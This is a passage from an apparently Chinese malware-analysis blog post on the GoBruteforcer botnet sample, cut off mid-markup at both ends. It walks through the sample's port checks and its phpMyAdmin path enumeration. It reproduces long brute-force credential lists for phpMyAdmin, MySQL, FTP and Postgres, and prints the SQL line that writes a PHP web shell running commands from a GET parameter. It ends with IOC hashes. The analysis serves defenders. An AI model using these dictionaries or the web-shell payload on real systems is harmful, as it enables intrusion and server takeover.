alt=\"image-20230317141606134\"></p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144309433.png\" alt=\"image-20230317144309433\"></p>\n<h2 id=\"2、暴力枚举凭据\"><a href=\"#2、暴力枚举凭据\" class=\"headerlink\" title=\"2、暴力枚举凭据\"></a>2、暴力枚举凭据</h2><h3 id=\"1-1-phpmyadmin\"><a href=\"#1-1-phpmyadmin\" class=\"headerlink\" title=\"1.1 phpmyadmin\"></a>1.1 phpmyadmin</h3><p>首先会检查端口80是否放开。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317141738391.png\" alt=\"image-20230317141738391\"></p>\n<p>接着通过爆破下来请求接口来寻找php信息页面。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/</span><br><span class=\"line\">/1phpmyadmin/</span><br><span class=\"line\">/2phpmyadmin/</span><br><span class=\"line\">/MyAdmin/</span><br><span class=\"line\">/PMA/</span><br><span class=\"line\">/_phpMyAdmin/</span><br><span class=\"line\">/__phpmyadmin/</span><br><span class=\"line\">/_phpmyadmin/</span><br><span class=\"line\">/_phpmyadmin_/</span><br><span class=\"line\">/admin/</span><br><span class=\"line\">/admin/db/</span><br><span class=\"line\">/admin/phpMyAdmin/</span><br><span class=\"line\">/admin/phpmyadmin/</span><br><span class=\"line\">/admin/pma/</span><br><span class=\"line\">/admin/sqladmin/</span><br><span class=\"line\">/admin/sysadmin/</span><br><span class=\"line\">/admin/web/</span><br><span class=\"line\">/administrator/PMA/</span><br><span class=\"line\">/administrator/admin/</span><br><span class=\"line\">/administrator/db/</span><br><span class=\"line\">/administrator/phpMyAdmin/</span><br><span class=\"line\">/administrator/phpmyadmin/</span><br><span class=\"line\">/administrator/pma/</span><br><span class=\"line\">/administrator/web/</span><br><span class=\"line\">/database/</span><br><span class=\"line\">/db/</span><br><span class=\"line\">/db/db-admin/</span><br><span class=\"line\">/db/dbadmin/</span><br><span class=\"line\">/db/dbweb/</span><br><span class=\"line\">/db/myadmin/</span><br><span class=\"line\">/db/phpMyAdmin-3/</span><br><span class=\"line\">/db/phpMyAdmin-4/</span><br><span class=\"line\">/db/phpMyAdmin-5/</span><br><span class=\"line\">/db/phpMyAdmin/</span><br><span class=\"line\">/db/phpMyAdmin3/</span><br><span class=\"line\">/db/phpmyadmin/</span><br><span class=\"line\">/db/phpmyadmin3/</span><br><span class=\"line\">/db/phpmyadmin4/</span><br><span class=\"line\">/db/phpmyadmin5/</span><br><span class=\"line\">/db/webadmin/</span><br><span class=\"line\">/db/webdb/</span><br><span class=\"line\">/db/websql/</span><br><span class=\"line\">/dbadmin/</span><br><span class=\"line\">/myadmin/</span><br><span class=\"line\">/mysql-admin/</span><br><span class=\"line\">/mysql/</span><br><span class=\"line\">/mysql/admin/</span><br><span class=\"line\">/mysql/db/</span><br><span class=\"line\">/mysql/dbadmin/</span><br><span class=\"line\">/mysql/mysqlmanager/</span><br><span class=\"line\">/mysql/pMA/</span><br><span class=\"line\">/mysql/pma/</span><br><span class=\"line\">/mysql/sqlmanager/</span><br><span class=\"line\">/mysql/web/</span><br><span class=\"line\">/mysqladmin/</span><br><span class=\"line\">/mysqlmanager/</span><br><span class=\"line\">/php-my-admin/</span><br><span class=\"line\">/php-myadmin/</span><br><span class=\"line\">/phpMyAdmin-3/</span><br><span class=\"line\">/phpMyAdmin-4.9.10-all-languages/</span><br><span class=\"line\">/phpMyAdmin-4.9.7/</span><br><span class=\"line\">/phpMyAdmin-4/</span><br><span class=\"line\">/phpMyAdmin-5.1.0/</span><br><span class=\"line\">/phpMyAdmin-5.1.1/</span><br><span class=\"line\">/phpMyAdmin-5.1.2/</span><br><span class=\"line\">/phpMyAdmin-5.1.3/</span><br><span class=\"line\">/phpMyAdmin-5.2.0-all-languages/</span><br><span class=\"line\">/phpMyAdmin-5.2.0/</span><br><span class=\"line\">/phpMyAdmin-5.3.0-all-languages/</span><br><span class=\"line\">/phpMyAdmin-5.3.0/</span><br><span class=\"line\">/phpMyAdmin-5/</span><br><span class=\"line\">/phpMyAdmin-latest-all-languages/</span><br><span class=\"line\">/phpMyAdmin-latest-english/</span><br><span class=\"line\">/phpMyAdmin/</span><br><span class=\"line\">/phpMyAdmin1/</span><br><span class=\"line\">/phpMyAdmin2/</span><br><span class=\"line\">/phpMyAdmin3/</span><br><span class=\"line\">/phpMyAdmin4/</span><br><span class=\"line\">/phpMyAdmin5.1/</span><br><span class=\"line\">/phpMyAdmin5.2/</span><br><span class=\"line\">/phpMyAdmin5/</span><br><span class=\"line\">/phpMyAdmin_/</span><br><span class=\"line\">/phpMyadmin/</span><br><span class=\"line\">/phpmy-admin/</span><br><span class=\"line\">/phpmy/</span><br><span class=\"line\">/phpmyAdmin/</span><br><span class=\"line\">/phpmyadmin/</span><br><span class=\"line\">/phpmyadmin1/</span><br><span class=\"line\">/phpmyadmin2/</span><br><span class=\"line\">/phpmyadmin2011/</span><br><span class=\"line\">/phpmyadmin2012/</span><br><span class=\"line\">/phpmyadmin2013/</span><br><span class=\"line\">/phpmyadmin2014/</span><br><span class=\"line\">/phpmyadmin2015/</span><br><span class=\"line\">/phpmyadmin2016/</span><br><span class=\"line\">/phpmyadmin2017/</span><br><span class=\"line\">/phpmyadmin2018/</span><br><span class=\"line\">/phpmyadmin2019/</span><br><span class=\"line\">/phpmyadmin2020/</span><br><span class=\"line\">/phpmyadmin2021/</span><br><span class=\"line\">/phpmyadmin2022/</span><br><span class=\"line\">/phpmyadmin3/</span><br><span class=\"line\">/phpmyadmin4/</span><br><span class=\"line\">/phpmyadmin5/</span><br><span class=\"line\">/phpmyadmin_/</span><br><span class=\"line\">/phppma/</span><br><span class=\"line\">/pma/</span><br><span class=\"line\">/program/</span><br><span class=\"line\">/shopdb/</span><br><span class=\"line\">/sql/myadmin/</span><br><span class=\"line\">/sql/php-myadmin/</span><br><span class=\"line\">/sql/phpMyAdmin/</span><br><span class=\"line\">/sql/phpMyAdmin2/</span><br><span class=\"line\">/sql/phpmanager/</span><br><span class=\"line\">/sql/phpmy-admin/</span><br><span class=\"line\">/sql/phpmyadmin3/</span><br><span class=\"line\">/sql/phpmyadmin4/</span><br><span class=\"line\">/sql/phpmyadmin5/</span><br><span class=\"line\">/sql/sql-admin/</span><br><span class=\"line\">/sql/sql/</span><br><span class=\"line\">/sql/sqladmin/</span><br><span class=\"line\">/sql/sqlweb/</span><br><span class=\"line\">/sql/webadmin/</span><br><span class=\"line\">/sql/webdb/</span><br><span class=\"line\">/sql/websql/</span><br><span class=\"line\">/sqlmanager/</span><br><span class=\"line\">/wp-content/plugins/portable-phpmyadmin/wp-pma-mod/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317141827819.png\" alt=\"image-20230317141827819\"></p>\n<p>如果能成功获取到页面信息，则获取版本号。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317150118856.png\" alt=\"image-20230317150118856\"></p>\n<p>然后进行暴力破解</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317142414318.png\" alt=\"image-20230317142414318\"></p>\n<p>使用的凭据如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin:123</span><br><span class=\"line\">admin:admin</span><br><span class=\"line\">admin:pass</span><br><span class=\"line\">admin:root</span><br><span class=\"line\">asustor:asustor</span><br><span class=\"line\">blog:blog</span><br><span class=\"line\">blog:wordpress</span><br><span class=\"line\">blog:wp</span><br><span class=\"line\">database:database</span><br><span class=\"line\">db:db</span><br><span class=\"line\">dbs:dbs</span><br><span class=\"line\">dev:dev</span><br><span class=\"line\">developer:developer</span><br><span class=\"line\">nas:nas</span><br><span class=\"line\">pma:pass</span><br><span class=\"line\">pma:pma</span><br><span class=\"line\">qnap:qnap</span><br><span class=\"line\">root:</span><br><span class=\"line\">root:000</span><br><span class=\"line\">root:0000</span><br><span class=\"line\">root:00000</span><br><span class=\"line\">root:000000</span><br><span class=\"line\">root:111111</span><br><span class=\"line\">root:123</span><br><span class=\"line\">root:123123</span><br><span class=\"line\">root:1234</span><br><span class=\"line\">root:12345</span><br><span class=\"line\">root:123456</span><br><span class=\"line\">root:1234567</span><br><span class=\"line\">root:12345678</span><br><span class=\"line\">root:123456789</span><br><span class=\"line\">root:1234567890</span><br><span class=\"line\">root:123qwe</span><br><span class=\"line\">root:123qweasd</span><br><span class=\"line\">root:123qweasdzxc</span><br><span class=\"line\">root:12qwaszx</span><br><span class=\"line\">root:2010</span><br><span class=\"line\">root:2011</span><br><span class=\"line\">root:2012</span><br><span class=\"line\">root:2013</span><br><span class=\"line\">root:2014</span><br><span class=\"line\">root:2015</span><br><span class=\"line\">root:2016</span><br><span class=\"line\">root:2017</span><br><span class=\"line\">root:2018</span><br><span class=\"line\">root:2019</span><br><span class=\"line\">root:2020</span><br><span class=\"line\">root:2021</span><br><span class=\"line\">root:2022</span><br><span class=\"line\">root:2023</span><br><span class=\"line\">root:321</span><br><span class=\"line\">root:4321</span><br><span class=\"line\">root:54321</span><br><span class=\"line\">root:654321</span><br><span class=\"line\">root:666666</span><br><span class=\"line\">root:NAS</span><br><span class=\"line\">root:Password</span><br><span class=\"line\">root:Password1</span><br><span class=\"line\">root:Password12</span><br><span class=\"line\">root:Password123</span><br><span class=\"line\">root:Qwerty123</span><br><span class=\"line\">root:ROOT</span><br><span class=\"line\">root:a123456</span><br><span class=\"line\">root:aa123456</span><br><span class=\"line\">root:aa12345678</span><br><span class=\"line\">root:abc123</span><br><span class=\"line\">root:acces</span><br><span class=\"line\">root:access</span><br><span class=\"line\">root:access123</span><br><span class=\"line\">root:admin</span><br><span class=\"line\">root:admin123</span><br><span class=\"line\">root:administrator</span><br><span class=\"line\">root:app</span><br><span class=\"line\">root:apptest</span><br><span class=\"line\">root:asustor</span><br><span class=\"line\">root:backup</span><br><span class=\"line\">root:backupdb</span><br><span class=\"line\">root:backupdbs</span><br><span class=\"line\">root:backups</span><br><span class=\"line\">root:backupserver</span><br><span class=\"line\">root:bitcoin</span><br><span class=\"line\">root:blog</span><br><span class=\"line\">root:blogs</span><br><span class=\"line\">root:charlie</span><br><span class=\"line\">root:confidential</span><br><span class=\"line\">root:crypto</span><br><span class=\"line\">root:database</span><br><span class=\"line\">root:databases</span><br><span class=\"line\">root:db</span><br><span class=\"line\">root:dbs</span><br><span class=\"line\">root:developer</span><br><span class=\"line\">root:dragon</span><br><span class=\"line\">root:files</span><br><span class=\"line\">root:football</span><br><span class=\"line\">root:freedom</span><br><span class=\"line\">root:gameserver</span><br><span class=\"line\">root:hello</span><br><span class=\"line\">root:host</span><br><span class=\"line\">root:iloveyou</span><br><span class=\"line\">root:letmein</span><br><span class=\"line\">root:linux</span><br><span class=\"line\">root:login</span><br><span class=\"line\">root:master</span><br><span class=\"line\">root:michael</span><br><span class=\"line\">root:monkey</span><br><span class=\"line\">root:music</span><br><span class=\"line\">root:mysql</span><br><span class=\"line\">root:nas</span><br><span class=\"line\">root:onetwothree</span><br><span class=\"line\">root:oracle</span><br><span class=\"line\">root:p455w0rd</span><br><span class=\"line\">root:pass</span><br><span class=\"line\">root:pass123</span><br><span class=\"line\">root:pass1234</span><br><span class=\"line\">root:pass12345</span><br><span class=\"line\">root:pass123456</span><br><span class=\"line\">root:pass2018</span><br><span class=\"line\">root:pass2019</span><br><span class=\"line\">root:pass2020</span><br><span class=\"line\">root:pass2021</span><br><span class=\"line\">root:pass2022</span><br><span class=\"line\">root:passw0rd</span><br><span class=\"line\">root:password</span><br><span class=\"line\">root:password1</span><br><span class=\"line\">root:password123</span><br><span class=\"line\">root:password2018</span><br><span class=\"line\">root:password2019</span><br><span class=\"line\">root:password2020</span><br><span class=\"line\">root:password2021</span><br><span class=\"line\">root:password2022</span><br><span class=\"line\">root:password321</span><br><span class=\"line\">root:passwords</span><br><span class=\"line\">root:princess</span><br><span class=\"line\">root:qazwsx</span><br><span class=\"line\">root:qnap</span><br><span class=\"line\">root:queen</span><br><span class=\"line\">root:qwerty</span><br><span class=\"line\">root:qwerty1</span><br><span class=\"line\">root:qwerty123</span><br><span class=\"line\">root:r00t</span><br><span class=\"line\">root:rock</span><br><span class=\"line\">root:root</span><br><span class=\"line\">root:root123</span><br><span class=\"line\">root:root1234</span><br><span class=\"line\">root:rootadmin</span><br><span class=\"line\">root:s3cr3t</span><br><span class=\"line\">root:secret</span><br><span class=\"line\">root:secret123</span><br><span class=\"line\">root:secure</span><br><span class=\"line\">root:security</span><br><span class=\"line\">root:senha</span><br><span class=\"line\">root:server</span><br><span class=\"line\">root:shop</span><br><span class=\"line\">root:solo</span><br><span class=\"line\">root:sqlaccess</span><br><span class=\"line\">root:starwars</span><br><span class=\"line\">root:sunshine</span><br><span class=\"line\">root:test</span><br><span class=\"line\">root:test123</span><br><span class=\"line\">root:toor</span><br><span class=\"line\">root:toor123</span><br><span class=\"line\">root:toor321</span><br><span class=\"line\">root:trump</span><br><span class=\"line\">root:trustno1</span><br><span class=\"line\">root:unix</span><br><span class=\"line\">root:usa</span><br><span class=\"line\">root:user</span><br><span class=\"line\">root:users</span><br><span class=\"line\">root:web</span><br><span class=\"line\">root:webadmin</span><br><span class=\"line\">root:webmaster</span><br><span class=\"line\">root:webs</span><br><span class=\"line\">root:welcome</span><br><span class=\"line\">root:whatever</span><br><span class=\"line\">root:windows</span><br><span class=\"line\">root:wordpres</span><br><span class=\"line\">root:wordpress</span><br><span class=\"line\">root:xampp</span><br><span class=\"line\">shop:shop</span><br><span class=\"line\">shopdb:shopdb</span><br><span class=\"line\">sql:sql</span><br><span class=\"line\">ueer:pass</span><br><span class=\"line\">user:123</span><br><span class=\"line\">user:1234</span><br><span class=\"line\">user:pass</span><br><span class=\"line\">web:web</span><br><span class=\"line\">wordpress:admin</span><br><span class=\"line\">wordpress:blog</span><br><span class=\"line\">wordpress:blogs</span><br><span class=\"line\">wordpress:pass</span><br><span class=\"line\">wordpress:password</span><br><span class=\"line\">wordpress:wordpress</span><br><span class=\"line\">wordpress:wordpress123</span><br><span class=\"line\">wordpress:wp</span><br><span class=\"line\">wordspress:root</span><br><span class=\"line\">wp:123</span><br><span class=\"line\">wp:pass</span><br><span class=\"line\">wp:password</span><br><span class=\"line\">wp:wp</span><br></pre></td></tr></table></figure>\n\n<p>爆破成功后会检查下列路径的有效性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/Volume0/Web/</span><br><span class=\"line\">/Volume1/Web/</span><br><span class=\"line\">/Volume2/Web/</span><br><span class=\"line\">/home/http/</span><br><span class=\"line\">/home/omg/htdocs/</span><br><span class=\"line\">/home/www-data/htdocs/</span><br><span class=\"line\">/home/www/htdocs/</span><br><span class=\"line\">/home/wwwroot/default/</span><br><span class=\"line\">/mnt/md0/TNAS/</span><br><span class=\"line\">/mnt/md0/appdata/</span><br><span class=\"line\">/mnt/md0/public/</span><br><span class=\"line\">/nas/content/live/</span><br><span class=\"line\">/opt/lampp/htdocs/</span><br><span class=\"line\">/share/CACHEDEV0_DATA/Web/</span><br><span class=\"line\">/share/CACHEDEV0_DATA/Web/htdocs/</span><br><span class=\"line\">/share/CACHEDEV1_DATA/Web/</span><br><span class=\"line\">/share/CACHEDEV1_DATA/Web/htdocs/</span><br><span class=\"line\">/share/CACHEDEV2_DATA/Web/</span><br><span class=\"line\">/share/CACHEDEV2_DATA/Web/htdocs/</span><br><span class=\"line\">/share/CACHEDEV3_DATA/Web/</span><br><span class=\"line\">/share/CACHEDEV3_DATA/Web/htdocs/</span><br><span class=\"line\">/share/CACHEDEV4_DATA/Web/</span><br><span class=\"line\">/share/CACHEDEV_DATA/Web/</span><br><span class=\"line\">/share/CE_CACHEDEV1_DATA/Web/</span><br><span class=\"line\">/share/HDA_DATA/Qweb/</span><br><span class=\"line\">/share/HDA_DATA/Web/</span><br><span class=\"line\">/share/MD0_DATA/Qweb/</span><br><span class=\"line\">/share/MD0_DATA/Web/</span><br><span class=\"line\">/share/Qweb/</span><br><span class=\"line\">/share/Web/</span><br><span class=\"line\">/src/http/</span><br><span class=\"line\">/src/http/htdocs/</span><br><span class=\"line\">/srv/www-data/</span><br><span class=\"line\">/svr/www/htdocs/</span><br><span class=\"line\">/usr/local/ampps/www/</span><br><span class=\"line\">/usr/local/ampps/www/admmini/</span><br><span class=\"line\">/usr/local/apache/htdocs/html/</span><br><span class=\"line\">/usr/local/apache/htdocs/manual/</span><br><span class=\"line\">/usr/local/apache/htdocs/www/</span><br><span class=\"line\">/usr/local/httpd/</span><br><span class=\"line\">/usr/local/www/</span><br><span class=\"line\">/usr/local/www/htdocs/</span><br><span class=\"line\">/usr/share/htdocs/</span><br><span class=\"line\">/usr/share/html/</span><br><span class=\"line\">/usr/share/httpd/</span><br><span class=\"line\">/usr/share/nginx/</span><br><span class=\"line\">/usr/share/nginx/html/</span><br><span class=\"line\">/usr/share/www/</span><br><span class=\"line\">/usr/www/</span><br><span class=\"line\">/usr/www/htdocs/</span><br><span class=\"line\">/var/apache/</span><br><span class=\"line\">/var/www/</span><br><span class=\"line\">/var/www/htdocs/</span><br><span class=\"line\">/var/www/html/</span><br><span class=\"line\">/var/www/html/localhost/</span><br><span class=\"line\">/var/www/html/localhost/public/</span><br><span class=\"line\">/volume0/Web/</span><br><span class=\"line\">/volume1/Web/</span><br><span class=\"line\">/volume2/Web/</span><br><span class=\"line\">/www/</span><br><span class=\"line\">/www/server/</span><br></pre></td></tr></table></figure>\n\n<p>并把如下反弹shell以<code>随即名.php</code>的形式写入有效路径中</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144856995.png\" alt=\"image-20230317144856995\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT \\&quot;&lt;?php <span class=\"built_in\">echo</span> <span class=\"string\">&#x27;PHP7E&lt;pre&gt;&#x27;</span>.@shell_exec(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;dmc&#x27;</span>]).<span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span>; ?&gt;\\&quot; INTO OUTFILE 随即名.php</span><br></pre></td></tr></table></figure>\n\n<p>然后通过执行写入的反弹shell进行执行<code>uname -a</code>获取受害者机器的信息。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144938684.png\" alt=\"image-20230317144938684\"></p>\n<p>最后根据获取到的信息来选择下载恶意模块并执行。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144001666.png\" alt=\"image-20230317144001666\"></p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144013541.png\" alt=\"image-20230317144013541\"></p>\n<p>恶意模块<code>x</code>实际上与远程shell<code>pst.php</code>内容相同，样本会将成功爆破的受害者机器作为一个跳板机。</p>\n<h3 id=\"1-2-mysql\"><a href=\"#1-2-mysql\" class=\"headerlink\" title=\"1.2 mysql\"></a>1.2 mysql</h3><p>检查是否打开3306端口。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144344536.png\" alt=\"image-20230317144344536\"></p>\n<p>存在则进行爆破。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144404437.png\" alt=\"image-20230317144404437\"></p>\n<p>使用的凭据如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin:</span><br><span class=\"line\">admin:000000</span><br><span class=\"line\">admin:1111</span><br><span class=\"line\">admin:111111</span><br><span class=\"line\">admin:11111111</span><br><span class=\"line\">admin:112233</span><br><span class=\"line\">admin:121212</span><br><span class=\"line\">admin:123123</span><br><span class=\"line\">admin:123321</span><br><span class=\"line\">admin:1234</span><br><span class=\"line\">admin:12345</span><br><span class=\"line\">admin:123456</span><br><span class=\"line\">admin:1234567</span><br><span class=\"line\">admin:12345678</span><br><span class=\"line\">admin:123456789</span><br><span class=\"line\">admin:1234567890</span><br><span class=\"line\">admin:123qwe</span><br><span class=\"line\">admin:131313</span><br><span class=\"line\">admin:159753</span><br><span class=\"line\">admin:1qaz2wsx</span><br><span class=\"line\">admin:abc123</span><br><span class=\"line\">admin:admin</span><br><span class=\"line\">admin:mysql</span><br><span class=\"line\">admin:pass</span><br><span class=\"line\">admin:password</span><br><span class=\"line\">admin:root</span><br><span class=\"line\">admin:zxcvbnm</span><br><span class=\"line\">blog:admin</span><br><span class=\"line\">blog:blog</span><br><span class=\"line\">blog:wordpress</span><br><span class=\"line\">cloud:cloud</span><br><span class=\"line\">cloudera:cloudera</span><br><span class=\"line\">dbuser:123</span><br><span class=\"line\">root:</span><br><span class=\"line\">root:000</span><br><span class=\"line\">root:0000</span><br><span class=\"line\">root:00000</span><br><span class=\"line\">root:000000</span><br><span class=\"line\">root:1111</span><br><span class=\"line\">root:111111</span><br><span class=\"line\">root:11111111</span><br><span class=\"line\">root:112233</span><br><span class=\"line\">root:121212</span><br><span class=\"line\">root:123</span><br><span class=\"line\">root:123123</span><br><span class=\"line\">root:123321</span><br><span class=\"line\">root:1234</span><br><span class=\"line\">root:12345</span><br><span class=\"line\">root:123456</span><br><span class=\"line\">root:1234567</span><br><span class=\"line\">root:12345678</span><br><span class=\"line\">root:123456789</span><br><span class=\"line\">root:1234567890</span><br><span class=\"line\">root:123456a</span><br><span class=\"line\">root:123456q</span><br><span class=\"line\">root:12345a</span><br><span class=\"line\">root:123qwe</span><br><span class=\"line\">root:131313</span><br><span class=\"line\">root:147258369</span><br><span class=\"line\">root:159753</span><br><span class=\"line\">root:1q2w3e</span><br><span class=\"line\">root:1q2w3e4r5t</span><br><span class=\"line\">root:1qaz2wsx</span><br><span class=\"line\">root:2000</span><br><span class=\"line\">root:2018</span><br><span class=\"line\">root:2019</span><br><span class=\"line\">root:2020</span><br><span class=\"line\">root:2021</span><br><span class=\"line\">root:2022</span><br><span class=\"line\">root:2023</span><br><span class=\"line\">root:2024</span><br><span class=\"line\">root:5201314</span><br><span class=\"line\">root:555555</span><br><span class=\"line\">root:654321</span><br><span class=\"line\">root:666666</span><br><span class=\"line\">root:6969</span><br><span class=\"line\">root:696969</span><br><span class=\"line\">root:777777</span><br><span class=\"line\">root:7777777</span><br><span class=\"line\">root:789456</span><br><span class=\"line\">root:789456123</span><br><span class=\"line\">root:987654</span><br><span class=\"line\">root:987654321</span><br><span class=\"line\">root:Password1</span><br><span class=\"line\">root:a12345</span><br><span class=\"line\">root:a123456</span><br><span class=\"line\">root:a1b2c3</span><br><span class=\"line\">root:aa12345678</span><br><span class=\"line\">root:aaa111</span><br><span class=\"line\">root:aaa123</span><br><span class=\"line\">root:aaaaaa</span><br><span class=\"line\">root:abc123</span><br><span class=\"line\">root:access</span><br><span class=\"line\">root:admin</span><br><span class=\"line\">root:alibaba</span><br><span class=\"line\">root:alipay</span><br><span class=\"line\">root:asdfgh</span><br><span class=\"line\">root:asdfghjkl</span><br><span class=\"line\">root:bitcoin</span><br><span class=\"line\">root:china</span><br><span class=\"line\">root:computer</span><br><span class=\"line\">root:crypo</span><br><span class=\"line\">root:dragon</span><br><span class=\"line\">root:football</span><br><span class=\"line\">root:freedom</span><br><span class=\"line\">root:fuck</span><br><span class=\"line\">root:fuckyou</span><br><span class=\"line\">root:iloveyou</span><br><span class=\"line\">root:ji32k7au4a83</span><br><span class=\"line\">root:letmein</span><br><span class=\"line\">root:love</span><br><span class=\"line\">root:master</span><br><span class=\"line\">root:mysql</span><br><span class=\"line\">root:p455w0rd</span><br><span class=\"line\">root:pass</span><br><span class=\"line\">root:pass123</span><br><span class=\"line\">root:passwd</span><br><span class=\"line\">root:password</span><br><span class=\"line\">root:password1</span><br><span class=\"line\">root:q1w2e3r4t5</span><br><span class=\"line\">root:qazwsx</span><br><span class=\"line\">root:qq123456</span><br><span class=\"line\">root:qwerty</span><br><span class=\"line\">root:qwertyuiop</span><br><span class=\"line\">root:ranger</span><br><span class=\"line\">root:raspberry</span><br><span class=\"line\">root:root</span><br><span class=\"line\">root:s3cr3t</span><br><span class=\"line\">root:secret</span><br><span class=\"line\">root:sql</span><br><span class=\"line\">root:taobao</span><br><span class=\"line\">root:testpw</span><br><span class=\"line\">root:trustno1</span><br><span class=\"line\">root:usbw</span><br><span class=\"line\">root:vagrant</span><br><span class=\"line\">root:wang1234</span><br><span class=\"line\">root:wordpress</span><br><span class=\"line\">root:xiao</span><br><span class=\"line\">root:zxcvbn</span><br><span class=\"line\">root:zxcvbnm</span><br><span class=\"line\">user:pass</span><br><span class=\"line\">user:password</span><br><span class=\"line\">wordpress:blog</span><br><span class=\"line\">wordpress:pass</span><br><span class=\"line\">wordpress:password</span><br><span class=\"line\">wordpress:wordpress</span><br><span class=\"line\">wp:wp</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-3-ftp\"><a href=\"#1-3-ftp\" class=\"headerlink\" title=\"1.3 ftp\"></a>1.3 ftp</h3><p>检查21端口是否存在。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144522011.png\" alt=\"image-20230317144522011\"></p>\n<p>存在则进行爆破。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144617635.png\" alt=\"image-20230317144617635\"></p>\n<p>使用的凭据如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www:www</span><br><span class=\"line\">nobody:lampp</span><br><span class=\"line\">nobody:xampp</span><br><span class=\"line\">daemon:lampp</span><br><span class=\"line\">daemon:xampp</span><br><span class=\"line\">website:website</span><br><span class=\"line\">blog:blog</span><br><span class=\"line\">wordpress:wordpress</span><br><span class=\"line\">wordpress:123456</span><br><span class=\"line\">website:123</span><br><span class=\"line\">website:123456</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-4-postgres\"><a href=\"#1-4-postgres\" class=\"headerlink\" title=\"1.4 postgres\"></a>1.4 postgres</h3><p>检查5432端口是否开放。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144656272.png\" alt=\"image-20230317144656272\"></p>\n<p>开放则进行爆破。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317144710849.png\" alt=\"image-20230317144710849\"></p>\n<p>使用的凭据如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">postgres:000000</span><br><span class=\"line\">postgres:1</span><br><span class=\"line\">postgres:123</span><br><span class=\"line\">postgres:1234</span><br><span class=\"line\">postgres:12345</span><br><span class=\"line\">postgres:123456</span><br><span class=\"line\">postgres:12qwaszx</span><br><span class=\"line\">postgres:Password1</span><br><span class=\"line\">postgres:admin</span><br><span class=\"line\">postgres:admin123</span><br><span class=\"line\">postgres:asd123</span><br><span class=\"line\">postgres:password</span><br><span class=\"line\">postgres:password1</span><br><span class=\"line\">postgres:postgres</span><br><span class=\"line\">postgres:qwerty</span><br><span class=\"line\">postgres:root</span><br><span class=\"line\">postgres:test</span><br><span class=\"line\">postgres:test123</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"三、IOC\"><a href=\"#三、IOC\" class=\"headerlink\" title=\"三、IOC\"></a>三、IOC</h1><h2 id=\"1、Md5\"><a href=\"#1、Md5\" class=\"headerlink\" title=\"1、Md5\"></a>1、Md5</h2><table>\n<thead>\n<tr>\n<th>md5</th>\n<th>name</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>45172413e29114dc3820d7e5e2b08b4b</td>\n<td>pst.php</td>\n</tr>\n<tr>\n<td>acc705210814ff5156957c028a8d6544deaca0555156504087fdc61f015d6834</td>\n<td>8f56aeb3d516e6deb858a73da66e1071</td>\n</tr>\n</tbody></table>\n<h2 id=\"2、IP-x2F-URL\"><a href=\"#2、IP-x2F-URL\" class=\"headerlink\" 